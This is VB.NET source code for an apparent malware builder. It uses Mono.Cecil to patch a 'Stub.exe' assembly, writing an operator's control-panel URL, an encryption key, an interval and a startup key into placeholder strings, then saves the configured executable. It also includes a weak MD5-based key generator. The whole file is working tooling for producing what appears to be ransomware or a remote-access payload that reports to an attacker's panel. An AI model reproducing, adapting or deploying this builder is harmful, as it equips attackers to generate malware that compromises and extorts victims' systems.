Imports System.Security.Cryptography
Imports System.Text
Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class Form1

    Public Shared Function hash(ByVal input As String) As String
        Try
            Dim md5 As MD5CryptoServiceProvider = New MD5CryptoServiceProvider()
            Dim temp As Byte() = md5.ComputeHash(Encoding.[Default].GetBytes(input))
            Dim sb As StringBuilder = New StringBuilder()
            For i As Integer = 0 To temp.Length - 1
                sb.Append(temp(i).ToString("x2"))
            Next

            Return sb.ToString()
        Catch ex As Exception
        End Try
    End Function

    Public Shared Function randomString(ByVal length As Integer) As String
        Try
            Dim b As Char() = "a1b2c3d4e5fZ6YgX7WhV8UiT9SjR0QkPlOmNnMoLpKqJrIsHtGuFvEwDxCyBzA".ToCharArray()
            Microsoft.VisualBasic.VBMath.Randomize()
            Dim s As StringBuilder = New StringBuilder()
            For i As Integer = 1 To length - 1
                Dim z As Integer = (CInt((((b.Length - 2) + 1) * Microsoft.VisualBasic.VBMath.Rnd()))) + 1
                s.Append(b(z))
            Next
            Return s.ToString()
        Catch ex As Exception
        End Try
    End Function

    Public Function generateKey() As String
        Try
            Dim res As String = randomString(5)
            res += TextBox1.Text
            res += randomString(5)
            res += randomString(5)
            Return hash(res)
        Catch ex As Exception
        End Try
    End Function

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If TextBox1.Text = "" OrElse TextBox3.Text = "" Then
                MessageBox.Show("Please fill in all fields.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Return
            End If

            If Not IO.File.Exists(Application.StartupPath + "\Stub\Stub.exe") Then
                MessageBox.Show("Stub not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Return
            End If
        Catch ex As Exception
        End Try

        Try
            Dim SFD As SaveFileDialog = New SaveFileDialog()
            SFD.Filter = "Executables (*.exe)|*.exe"

            Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\Stub\stub.exe"))
            Dim definition2 As ModuleDefinition
            For Each definition2 In definition.Modules
                Dim definition3 As TypeDefinition
                For Each definition3 In definition2.Types
                    Dim definition4 As MethodDefinition
                    For Each definition4 In definition3.Methods
                        If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                            Dim enumerator As IEnumerator(Of Instruction)
                            Try
                                enumerator = definition4.Body.Instructions.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As Instruction = enumerator.Current
                                    If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                        Dim str As String = current.Operand.ToString
                                        If (str = "#panelurl#") Then
                                            current.Operand = TextBox1.Text
                                        End If
                                        If (str = "#encryptionkey#") Then
                                            current.Operand = TextBox3.Text
                                        End If
                                        If (str = "#rint#") Then
                                            current.Operand = NumericUpDown1.Text
                                        End If
                                        If (str = "#startkey#") Then
                                            current.Operand = TextBox2.Text
                                        End If
                                    End If
                                Loop
                            Finally
                            End Try
                        End If
                    Next
                Next
            Next

            If SFD.ShowDialog() = System.Windows.Forms.DialogResult.OK Then
                definition.Write(SFD.FileName)
                MsgBox("Done", MsgBoxStyle.Information)
            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub Button2_Click_1(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            TextBox3.Text = generateKey()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.MaximizeBox = False
    End Sub
End Class

